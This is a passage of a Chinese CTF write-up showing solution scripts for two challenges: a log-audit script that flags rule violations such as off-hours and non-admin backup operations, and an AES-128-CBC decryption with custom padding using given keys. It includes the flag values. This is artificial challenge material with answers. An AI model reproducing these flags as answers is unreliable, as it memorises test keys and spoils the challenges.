class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># 用户权限字典，写死你给的用户权限（可根据需要扩展）</span><br>users = &#123;<br>    <span class="hljs-string">&#x27;user1&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;IT&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;server_data&#x27;</span>,<span class="hljs-string">&#x27;system_logs&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user2&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;budget_data&#x27;</span>,<span class="hljs-string">&#x27;payment_records&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user3&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;IT&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;system_logs&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user4&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;employee_info&#x27;</span>,<span class="hljs-string">&#x27;personal_info&#x27;</span>,<span class="hljs-string">&#x27;salary_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;BACKUP&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user5&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;product_info&#x27;</span>,<span class="hljs-string">&#x27;sales_records&#x27;</span>,<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user6&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;sales_records&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user7&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;payment_records&#x27;</span>,<span class="hljs-string">&#x27;budget_data&#x27;</span>,<span class="hljs-string">&#x27;financial_reports&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user8&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;budget_data&#x27;</span>,<span class="hljs-string">&#x27;payment_records&#x27;</span>,<span class="hljs-string">&#x27;financial_reports&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user9&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;employee_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user10&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;financial_reports&#x27;</span>,<span class="hljs-string">&#x27;budget_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user11&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;sales_records&#x27;</span>,<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user12&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;customer_data&#x27;</span>,<span class="hljs-string">&#x27;sales_records&#x27;</span>,<span class="hljs-string">&#x27;product_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user13&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;customer_data&#x27;</span>,<span class="hljs-string">&#x27;product_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user14&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;personal_info&#x27;</span>,<span class="hljs-string">&#x27;employee_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user15&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user16&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;product_info&#x27;</span>,<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user17&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user18&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;personal_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user19&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;budget_data&#x27;</span>,<span class="hljs-string">&#x27;payment_records&#x27;</span>,<span class="hljs-string">&#x27;financial_reports&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user20&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;salary_data&#x27;</span>,<span class="hljs-string">&#x27;employee_info&#x27;</span>,<span class="hljs-string">&#x27;personal_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>&#125;<br><br><span class="hljs-comment"># 敏感字段关键词</span><br>sensitive_keywords = [<span class="hljs-string">&#x27;salary&#x27;</span>, <span class="hljs-string">&#x27;ssn&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;address&#x27;</span>]<br><br><span class="hljs-comment"># 读取日志文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_logs</span>(<span class="hljs-params">filename</span>):<br>    logs = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            line = line.strip()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment"># 格式：日志ID 日期 时间 用户名 操作类型 操作目标 其他信息</span><br>            <span class="hljs-comment"># 示例：</span><br>            <span class="hljs-comment"># 1 2025-11-28 17:56:18 user2 QUERY payment_records operation=SELECT</span><br>            parts = line.split()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &lt; <span class="hljs-number">6</span>:<br>                <span class="hljs-keyword">continue</span><br>            log_id = parts[<span class="hljs-number">0</span>]<br>            date = parts[<span class="hljs-number">1</span>]<br>            time = parts[<span class="hljs-number">2</span>]<br>            username = parts[<span class="hljs-number">3</span>]<br>            operation_type = parts[<span class="hljs-number">4</span>]<br>            operation_target = parts[<span class="hljs-number">5</span>]<br>            other_info = <span class="hljs-string">&quot; &quot;</span>.join(parts[<span class="hljs-number">6</span>:]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>            logs.append(&#123;<br>                <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">int</span>(log_id),<br>                <span class="hljs-string">&#x27;date&#x27;</span>: date,<br>                <span class="hljs-string">&#x27;time&#x27;</span>: time,<br>                <span class="hljs-string">&#x27;username&#x27;</span>: username,<br>                <span class="hljs-string">&#x27;operation_type&#x27;</span>: operation_type,<br>                <span class="hljs-string">&#x27;operation_target&#x27;</span>: operation_target,<br>                <span class="hljs-string">&#x27;other_info&#x27;</span>: other_info,<br>                <span class="hljs-string">&#x27;raw_line&#x27;</span>: line,<br>            &#125;)<br>    <span class="hljs-keyword">return</span> logs<br><br><span class="hljs-comment"># 检查跨部门访问违规（规则1）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule1</span>(<span class="hljs-params">user, table</span>):<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users:<br>        <span class="hljs-comment"># 用户未登记，视为违规</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    allowed_tables = users[user][<span class="hljs-string">&#x27;tables&#x27;</span>]<br>    <span class="hljs-keyword">return</span> table <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> allowed_tables<br><br><span class="hljs-comment"># 检查敏感字段访问违规（规则2）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule2</span>(<span class="hljs-params">log_line</span>):<br>    <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> sensitive_keywords:<br>        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;\b&#x27;</span>+kw+<span class="hljs-string">r&#x27;\b&#x27;</span>, log_line, re.IGNORECASE):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 检查非工作时间操作违规（规则3）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule3</span>(<span class="hljs-params">time_str, operation_type</span>):<br>    hour = <span class="hljs-built_in">int</span>(time_str.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= hour &lt; <span class="hljs-number">5</span>:<br>        <span class="hljs-comment"># 只检测数据库操作（假设除LOGIN_外操作）</span><br>        <span class="hljs-keyword">if</span> operation_type <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;QUERY&#x27;</span>,<span class="hljs-string">&#x27;BACKUP&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 检查非管理员备份操作违规（规则4）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule4</span>(<span class="hljs-params">user, operation_type</span>):<br>    <span class="hljs-keyword">if</span> operation_type == <span class="hljs-string">&#x27;BACKUP&#x27;</span>:<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users <span class="hljs-keyword">or</span> users[user][<span class="hljs-string">&#x27;role&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    logs = load_logs(<span class="hljs-string">&#x27;database_logs.txt&#x27;</span>)<br>    violations = []<br><br>    <span class="hljs-keyword">for</span> log <span class="hljs-keyword">in</span> logs:<br>        log_id = log[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        user = log[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        op_type = log[<span class="hljs-string">&#x27;operation_type&#x27;</span>]<br>        table = log[<span class="hljs-string">&#x27;operation_target&#x27;</span>]<br>        time = log[<span class="hljs-string">&#x27;time&#x27;</span>]<br>        raw_line = log[<span class="hljs-string">&#x27;raw_line&#x27;</span>]<br><br>        <span class="hljs-comment"># 规则1</span><br>        <span class="hljs-keyword">if</span> op_type <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;QUERY&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>):<br>            <span class="hljs-keyword">if</span> check_rule1(user, table):<br>                violations.append(<span class="hljs-string">f&quot;1-<span class="hljs-subst">&#123;log_id&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 规则2</span><br>        <span class="hljs-keyword">if</span> check_rule2(raw_line):<br>            violations.append(<span class="hljs-string">f&quot;2-<span class="hljs-subst">&#123;log_id&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 规则3</span><br>        <span class="hljs-keyword">if</span> check_rule3(time, op_type):<br>            violations.append(<span class="hljs-string">f&quot;3-<span class="hljs-subst">&#123;log_id&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 规则4</span><br>        <span class="hljs-keyword">if</span> check_rule4(user, op_type):<br>            violations.append(<span class="hljs-string">f&quot;4-<span class="hljs-subst">&#123;log_id&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 去重排序</span><br>    violations = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(violations), key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x.split(<span class="hljs-string">&#x27;-&#x27;</span>)[<span class="hljs-number">1</span>]))<br><br>    output = <span class="hljs-string">&quot;,&quot;</span>.join(violations)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;违规记录: <span class="hljs-subst">&#123;output&#125;</span>&quot;</span>)<br><br>    md5_val = hashlib.md5(output.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;md5_val&#125;</span>&#125;&#125;&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>检测出违规记录为</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">违规记录: 4<span class="hljs-string">-380</span>,2<span class="hljs-string">-703</span>,4<span class="hljs-string">-862</span>,1<span class="hljs-string">-1056</span>,1<span class="hljs-string">-1243</span>,1<span class="hljs-string">-1360</span>,3<span class="hljs-string">-1395</span>,3<span class="hljs-string">-1433</span>,3<span class="hljs-string">-1553</span>,2<span class="hljs-string">-1644</span>,3<span class="hljs-string">-1838</span>,3<span class="hljs-string">-1872</span>,2<span class="hljs-string">-2101</span>,2<span class="hljs-string">-2113</span><br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>ff4054d20e07b42411bded1d6d895cf&#125;<br></code></pre></td></tr></table></figure><h2 id="AES-Custom-Padding"><a href="#AES-Custom-Padding" class="headerlink" title="AES_Custom_Padding"></a>AES_Custom_Padding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">背景：某系统对备份数据使用 AES-<span class="hljs-number">128</span>-CBC 加密，但采用了自定义填充：<br><br>在明文末尾添加一个字节 <span class="hljs-number">0x80</span>；<br>之后使用 <span class="hljs-number">0x00</span> 进行填充直到达到 <span class="hljs-number">16</span> 字节块长。 （注意：如果明文恰好是块长整数倍，同样需要追加一个完整填充块 <span class="hljs-number">0x80</span> + <span class="hljs-number">0x00</span>*<span class="hljs-number">15</span>）<br>已知：<br><br>Key（<span class="hljs-built_in">hex</span>）：0123456789ABCDEF0123456789ABCDEF<br>IV （<span class="hljs-built_in">hex</span>）：<span class="hljs-number">000</span>102030405060708090A0B0C0D0E0F<br>加密文件：cipher.<span class="hljs-built_in">bin</span>（Base64 编码的密文）<br>任务：编写解密程序，使用给定 Key/IV 进行 AES-<span class="hljs-number">128</span>-CBC 解密，并按上述自定义填充去除填充，得到明文。<br></code></pre></td></tr></table></figure><p>打开附件拿到密文</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WU</span>+<span class="hljs-number">8</span>dpscYYw+q52uQqX8OPiesnTajq++AXj05zX3u9an27JZR9/<span class="hljs-number">31</span>yZaWdtPM5df<br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_custom_padding</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    i = <span class="hljs-built_in">len</span>(data) - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> i &gt;= <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> data[i] == <span class="hljs-number">0x00</span>:<br>        i -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> data[i] != <span class="hljs-number">0x80</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Invalid padding&quot;</span>)<br>    <span class="hljs-keyword">return</span> data[:i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_cbc_decrypt</span>(<span class="hljs-params">ciphertext: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span>, iv: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    plaintext_padded = cipher.decrypt(ciphertext)<br>    <span class="hljs-keyword">return</span> remove_custom_padding(plaintext_padded)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;0123456789ABCDEF0123456789ABCDEF&quot;</span>)<br>    iv = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;000102030405060708090A0B0C0D0E0F&quot;</span>)<br>    b64_ciphertext = <span class="hljs-string">&quot;WU+8dpscYYw+q52uQqX8OPiesnTajq++AXj05zX3u9an27JZR9/31yZaWdtPM5df&quot;</span><br>    ciphertext = base64.b64decode(b64_ciphertext)<br><br>    <span class="hljs-keyword">try</span>:<br>        plaintext = aes_cbc_decrypt(ciphertext, key, iv)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密明文(utf-8解码尝试):&quot;</span>)<br>        <span class="hljs-built_in">print</span>(plaintext.decode(<span 